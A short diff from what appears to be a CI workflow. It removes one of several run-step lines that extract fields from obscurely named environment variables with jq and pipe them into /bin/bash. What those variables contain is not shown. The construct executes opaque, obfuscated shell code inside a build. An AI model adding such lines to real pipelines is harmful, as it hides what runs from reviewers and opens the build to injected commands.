@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$uaf395" | jq -r .cjolz95 | /bin/bash
           echo $wlkjj60224 | jq -r .j6 | /bin/bash
-          printf '%s' "$jwkze21780" | jq -r .u8 | /bin/bash
           echo $emc972 | jq -r .xizxe612 | /bin/bash
 
       - name: Archive results
